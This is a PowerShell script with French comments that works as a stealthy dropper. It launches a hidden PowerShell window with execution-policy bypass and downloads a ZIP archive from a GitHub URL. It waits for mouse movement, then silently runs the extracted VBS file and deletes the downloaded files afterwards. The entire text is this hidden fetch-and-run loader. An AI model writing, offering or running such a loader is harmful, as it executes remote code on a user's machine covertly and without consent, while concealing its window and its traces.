# Masquer complètement la fenêtre PowerShell en utilisant Start-Process
$script = {
    # Chemin temporaire pour stocker le fichier ZIP
    $tempZipPath = "$env:TEMP\Goose.zip"
    $tempExtractPath = "$env:TEMP\Goose"

    # Téléchargement du fichier ZIP depuis l'URL
    Invoke-WebRequest -Uri "https://github.com/ertvg/h/raw/main/Goose.zip" -OutFile $tempZipPath

    # Extraction du fichier ZIP
    Expand-Archive -Path $tempZipPath -DestinationPath $tempExtractPath

    # Chemin du fichier VBS à exécuter
    $vbsFilePath = "$tempExtractPath\Goose.vbs"

    # Détection du mouvement de la souris
    Add-Type -TypeDefinition @"
        using System;
        using System.Runtime.InteropServices;
        public class Mouse {
            [DllImport("user32.dll")]
            public static extern bool GetCursorPos(ref System.Drawing.Point lpPoint);
        }
"@
    $lastPos = New-Object System.Drawing.Point
    $currentPos = New-Object System.Drawing.Point

    while ($true) {
        [Mouse]::GetCursorPos([ref]$currentPos)
        if ($currentPos -ne $lastPos) {
            # Si un mouvement de souris est détecté, exécuter le fichier VBS
            if (Test-Path $vbsFilePath) {
                cscript.exe //B //Nologo $vbsFilePath
                break
            } else {
                Write-Host 'Le fichier Goose.vbs n\'a pas été trouvé.'
                break
            }
        }
        $lastPos = $currentPos
        Start-Sleep -Seconds 1
    }

    # Optionnel: Nettoyer les fichiers temporaires après l'exécution
    Remove-Item -Path $tempZipPath -Force
    Remove-Item -Path $tempExtractPath -Recurse -Force
}

# Exécuter le script PowerShell en arrière-plan sans afficher la fenêtre
Start-Process powershell -ArgumentList "-NoProfile -ExecutionPolicy Bypass -Command & {$($script)}" -WindowStyle Hidden
